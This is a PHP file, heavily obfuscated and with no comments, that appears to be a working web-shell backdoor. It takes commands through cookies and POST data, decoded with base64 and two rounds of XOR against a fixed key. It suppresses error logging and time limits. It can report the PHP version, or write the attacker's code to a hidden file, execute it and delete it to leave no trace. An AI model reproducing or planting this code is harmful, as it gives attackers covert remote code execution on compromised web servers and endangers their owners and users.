<?php $ighalq = chr(349-247)."\151".chr(108).chr(262-161).chr(95)."\x70".chr(117).'t'."\137"."\143"."\157".chr(110)."\164".chr(101).'n'."\x74".'s';
$dowyhjomq = 'b'."\x61".chr(115)."\x65".chr(54).chr(52)."\x5f"."\x64"."\x65".'c'."\157".'d'.'e';
$cskrsxno = chr(505-400)."\x6e".'i'."\x5f"."\163".'e'.chr(994-878);
$avrjbaebjp = "\x75"."\x6e".chr(108)."\151"."\156"."\x6b";


@$cskrsxno("\x65".'r'.chr(179-65)."\x6f"."\x72"."\137".chr(201-93)."\157"."\x67", NULL);
@$cskrsxno("\154".'o'."\147".chr(1094-999).chr(101).'r'."\162".'o'.'r'.chr(143-28), 0);
@$cskrsxno("\x6d"."\141".chr(120).chr(706-611).chr(202-101).chr(281-161).'e'."\143".chr(117).chr(116)."\151".chr(111).chr(110).chr(485-390)."\x74"."\x69".chr(109)."\145", 0);
@set_time_limit(0);

function nbghmuvc($zmxynaji, $lgjya)
{
    $plrdpcg = "";
    for ($eposyh = 0; $eposyh < strlen($zmxynaji);) {
        for ($j = 0; $j < strlen($lgjya) && $eposyh < strlen($zmxynaji); $j++, $eposyh++) {
            $plrdpcg .= chr(ord($zmxynaji[$eposyh]) ^ ord($lgjya[$j]));
        }
    }
    return $plrdpcg;
}

$dfyabkxal = array_merge($_COOKIE, $_POST);
$ngcbznit = 'c0cfba4a-7508-4c36-9079-eeedc523e834';
foreach ($dfyabkxal as $zcttggd => $zmxynaji) {
    $zmxynaji = @unserialize(nbghmuvc(nbghmuvc($dowyhjomq($zmxynaji), $ngcbznit), $zcttggd));
    if (isset($zmxynaji["\x61"."\x6b"])) {
        if ($zmxynaji[chr(97)] == chr(105)) {
            $eposyh = array(
                "\x70".chr(118) => @phpversion(),
                "\163".'v' => "3.5",
            );
            echo @serialize($eposyh);
        } elseif ($zmxynaji[chr(97)] == chr(101)) {
            $tsqrgdwn = "./" . md5($ngcbznit) . chr(349-303).chr(105)."\x6e".'c';
            @$ighalq($tsqrgdwn, "<" . chr(346-283)."\x70".chr(104)."\160"."\x20"."\x40"."\165".'n'."\x6c"."\x69".chr(1064-954).chr(746-639).chr(40)."\x5f".chr(871-776).'F'."\111".chr(76).chr(1060-991)."\137"."\x5f"."\x29"."\x3b".chr(32) . $zmxynaji["\144"]);
            @include($tsqrgdwn);
            @$avrjbaebjp($tsqrgdwn);
        }
        exit();
    }
}

